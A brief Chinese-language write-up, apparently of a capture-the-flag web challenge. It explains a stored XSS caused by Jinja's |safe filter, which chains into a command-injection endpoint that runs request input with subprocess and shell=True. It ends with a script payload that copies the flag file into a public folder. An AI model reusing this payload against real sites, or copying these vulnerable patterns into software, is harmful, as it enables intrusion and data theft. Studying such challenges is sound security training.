XSS 
addresses.html 用的jinja safe过滤 对内容不加转义输出导致存在xss存储型
 <h1>Addresses:</h1>
{% for address in addresses %}
    <p>{{ address|safe }}</p>
{% endfor %}

/api/stats端点存在任意命令执行但必须本地运行
@app.route("/api/stats", methods=["GET"])
def stats():
    # codes omitted for brevity

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results

攻击利用：
从xss存储型执行任意命令读取文件

payload:
<script>fetch("/api/stats?command=cp+/flag*+/app/static/flag.txt");</script>
